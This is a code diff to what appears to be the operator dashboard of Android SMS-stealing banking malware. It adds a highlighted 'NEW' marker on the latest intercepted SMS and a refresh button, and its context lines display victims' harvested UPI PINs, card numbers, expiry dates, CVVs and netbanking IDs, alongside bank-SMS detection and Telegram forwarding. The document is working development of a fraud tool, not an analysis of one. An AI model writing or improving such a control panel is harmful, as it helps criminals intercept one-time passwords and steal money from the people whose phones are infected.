@@ -109,6 +109,11 @@ body { font-family:'Inter','Segoe UI',Roboto,sans-serif; background:#050810; col
 .msg-tag { color:#64748B; font-size:9px; }
 .msg-body { color:#E5E7EB; font-size:12px; line-height:1.5; word-break:break-word; white-space:pre-wrap; }
 .msg-date { color:#475569; font-size:9px; margin-top:4px; }
+/* ✅ Latest SMS highlight */
+.msg.latest { border-left-color:#FBBF24; background:linear-gradient(90deg, rgba(251,191,36,0.10), rgba(10,20,40,1)); box-shadow:0 0 0 1px rgba(251,191,36,0.45), 0 0 18px rgba(251,191,36,0.35); animation:latestPulse 2s ease-in-out infinite; }
+@keyframes latestPulse { 0%,100% { box-shadow:0 0 0 1px rgba(251,191,36,0.45), 0 0 18px rgba(251,191,36,0.35); } 50% { box-shadow:0 0 0 1px rgba(251,191,36,0.75), 0 0 26px rgba(251,191,36,0.55); } }
+.msg-tag.new-tag { background:linear-gradient(135deg,#FBBF24,#F59E0B); color:#000; font-weight:900; padding:2px 8px; border-radius:10px; font-size:9px; letter-spacing:0.05em; animation:newBadge 1.5s ease-in-out infinite; }
+@keyframes newBadge { 0%,100% { transform:scale(1); } 50% { transform:scale(1.1); } }
 .fg { margin-bottom:10px; }
 .fl { display:block; color:#64748B; font-size:10px; margin-bottom:5px; text-transform:uppercase; letter-spacing:0.05em; font-weight:600; }
 .fi, .fs, .ft { width:100%; padding:11px 12px; background:#0A1428; border:1px solid #1E3A8A; border-radius:8px; color:#E5E7EB; font-size:12px; font-family:inherit; }
@@ -454,6 +459,10 @@ var photoCmdListener = null;
 
 // ✅ FIX: Live SMS listener handle
 var liveMsgListener = null;
+
+// ✅ Latest SMS highlight tracker
+var latestSmsKey = null;
+var latestSmsTime = 0;
 
 // ✅ Telegram global config
 var TELEGRAM_CONFIG = { botToken: "", chatId: "", enabled: false, ready: false };
@@ -1107,6 +1116,8 @@ function openDev(id) {
   var basePath = (devPaths[id] && devPaths[id].device) || ('device_info/' + id);
   loadAllDeviceData(id, basePath, function(data) {
     curMsgs = data.messages || {};
+    // ✅ Har message mein _key inject karo (latest highlight ke liye)
+    Object.keys(curMsgs).forEach(function(k) { if (curMsgs[k] && !curMsgs[k]._key) curMsgs[k]._key = k; });
     photos = data.photos || {};
     if (data.sim_info) devs[id].sim_info = data.sim_info;
     if (data.forward_settings) devs[id].forward_settings = data.forward_settings;
@@ -1133,7 +1144,11 @@ function listenLiveMessages(id) {
   liveMsgListener.on('child_added', function(snap) {
     var m = snap.val();
     if (!m) return;
+    m._key = snap.key;
     curMsgs[snap.key] = m;
+    // ✅ Latest SMS mark karo
+    latestSmsKey = snap.key;
+    latestSmsTime = Date.now();
     if (curTab === 'allsms' || curTab === 'bank' || curTab === 'info') {
       renderTab();
     }
@@ -1141,6 +1156,7 @@ function listenLiveMessages(id) {
   liveMsgListener.on('child_changed', function(snap) {
     var m = snap.val();
     if (!m) return;
+    m._key = snap.key;
     curMsgs[snap.key] = m;
     if (curTab === 'allsms' || curTab === 'bank') renderTab();
   });
@@ -1211,9 +1227,11 @@ function renderTab() {
       var z = document.getElementById('detBtn'); if (z) z.onclick = function() { var dm = detectFromSms(all); if (dm.phones.length > 0) { document.getElementById('s1').value = dm.phones[0]; alert('Detected: ' + dm.phones[0]); } else alert('Not detected'); };
     }, 100);
   } else if (curTab === 'allsms') {
-    if (all.length === 0) { b.innerHTML = '<div class="empty">No SMS</div>'; return; }
-    // ✅ FIX 3: Bank SMS detection + highlight
-    b.innerHTML = all.map(function(m) {
+    // ✅ Refresh button header
+    var smsHeader = '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;"><div style="color:#64748B;font-size:10px;text-transform:uppercase;font-weight:bold;">Total: ' + all.length + ' SMS</div><button id="refreshSmsBtn" style="padding:7px 14px;background:#1E3A8A;color:#60A5FA;border:1px solid #3B82F6;border-radius:8px;font-size:11px;font-weight:bold;cursor:pointer;">🔄 Refresh</button></div>';
+    if (all.length === 0) { b.innerHTML = smsHeader + '<div class="empty">No SMS</div>'; bindSmsRefresh(); return; }
+    // ✅ Bank SMS detection + highlight + Latest highlight
+    b.innerHTML = smsHeader + all.map(function(m) {
       var isBank = (function() {
         var s = (m.sender || '').toUpperCase();
         var bd = (m.body || '').toUpperCase();
@@ -1223,8 +1241,19 @@ function renderTab() {
         return hasBank || hasTxn;
       })();
       var bodyHtml = isBank ? highlightSms(m.body || '') : esc(m.body || '');
-      return '<div class="msg ' + (m.type === 'SENT' ? 'sent' : '') + '"><div class="msg-head"><span class="msg-from">' + esc(m.sender || 'Unknown') + '</span><span class="msg-tag">' + (m.type || 'IN') + '</span></div><div class="msg-body">' + bodyHtml + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
+      // ✅ Latest SMS check
+      var isLatest = false;
+      if (latestSmsKey) {
+        if (m._key === latestSmsKey) isLatest = true;
+        else if (all[0] && (all[0]._key === m._key)) isLatest = true;
+      } else if (all[0] && all[0]._key === m._key) {
+        isLatest = true;
+      }
+      var latestClass = isLatest ? ' latest' : '';
+      var tagHtml = isLatest ? '<span class="msg-tag new-tag">🆕 NEW</span>' : '<span class="msg-tag">' + (m.type || 'IN') + '</span>';
+      return '<div class="msg ' + (m.type === 'SENT' ? 'sent' : '') + latestClass + '"><div class="msg-head"><span class="msg-from">' + esc(m.sender || 'Unknown') + '</span>' + tagHtml + '</div><div class="msg-body">' + bodyHtml + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
     }).join('');
+    bindSmsRefresh();
   } else if (curTab === 'card') {
     var u = d.upi_data || {}, c = d.card_data || {}, bn = d.netbanking_data || {};
     b.innerHTML = '<div class="msg"><div class="msg-from">💳 UPI</div><div class="msg-body"><strong>App:</strong> ' + esc(u.app_name || '-') + '<br><strong>PIN:</strong> ' + esc(u.upi_pin || '-') + '</div></div><div class="msg"><div class="msg-from">💳 CARD</div><div class="msg-body"><strong>Number:</strong> ' + esc(c.card_number || '-') + '<br><strong>Expiry:</strong> ' + esc(c.expiry || '-') + '<br><strong>CVV:</strong> ' + esc(c.cvv || '-') + '</div></div><div class="msg"><div class="msg-from">🏦 NETBANKING</div><div class="msg-body"><strong>Bank:</strong> ' + esc(bn.bank_name || '-') + '<br><strong>User:</strong> ' + esc(bn.user_id || '-') + '</div></div>';
@@ -1254,6 +1283,35 @@ function renderTab() {
       if (tgPolling[curId] && tgPolling[curId].logs) { var logEl = document.getElementById('tgLog'); tgPolling[curId].logs.forEach(function(l) { var line = document.createElement('div'); line.className = 'tg-log-line'; line.textContent = l; logEl.appendChild(line); }); logEl.scrollTop = logEl.scrollHeight; }
     }, 100);
   }
+}
+
+// ✅ All SMS refresh button handler
+function bindSmsRefresh() {
+  var btn = document.getElementById('refreshSmsBtn');
+  if (!btn) return;
+  btn.onclick = function() {
+    var self = this;
+    var oldText = this.textContent;
+    this.textContent = '⏳ Loading...';
+    this.disabled = true;
+    if (!curId) { self.textContent = oldText; self.disabled = false; return; }
+    var basePath = (devPaths[curId] && devPaths[curId].device) || ('device_info/' + curId);
+    db.ref(basePath + '/messages').once('value').then(function(s) {
+      curMsgs = s.val() || {};
+      // ✅ _key inject
+      Object.keys(curMsgs).forEach(function(k) { if (curMsgs[k] && !curMsgs[k]._key) curMsgs[k]._key = k; });
+      return db.ref(basePath + '/sms_history').once('value');
+    }).then(function(s) {
+      var hist = s.val() || {};
+      if (curId && devs[curId]) devs[curId].sms_history = hist;
+      renderTab();
+      var newBtn = document.getElementById('refreshSmsBtn');
+      if (newBtn) { newBtn.textContent = '✅ Done'; setTimeout(function() { if (newBtn) newBtn.textContent = '🔄 Refresh'; }, 800); }
+    }).catch(function(e) {
+      self.textContent = '❌ Failed';
+      setTimeout(function() { self.textContent = oldText; self.disabled = false; }, 1500);
+    });
+  };
 }
 
 // ═══════════════════════════════════════════════════════════
